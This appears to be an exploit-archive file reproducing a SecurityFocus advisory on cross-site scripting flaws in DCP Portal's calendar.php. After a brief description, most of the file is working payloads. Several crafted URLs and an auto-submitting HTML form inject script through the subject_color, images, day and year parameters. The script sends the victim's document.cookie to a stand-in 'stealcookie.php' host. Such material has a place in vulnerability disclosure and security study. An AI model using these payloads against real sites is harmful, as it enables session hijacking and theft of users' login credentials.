@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/17050/info
+ 
+DCP Portal is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+ 
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/dcp-portal611/calendar.php?subject_color="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
+http://www.example.com/dcp-portal611/calendar.php?images="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
+http://www.example.com/dcp-portal611/calendar.php?day=<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script> 
+
+<form action='http://www.example.com/dcp-portal611/calendar.php?show=full_month&month=02&day="><script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>' method="post">
+<input type="text" name="year" value='2006' />
+<input type="submit">
+</form>
+<script type="text/javascript">
+document.forms[0].submit();
+</script>
+
+http://www.example.com/dcp-portal611/calendar.php?year=<script>document.location="http://www.example.com/stealcookie.php?"%2bdocument.cookie</script>
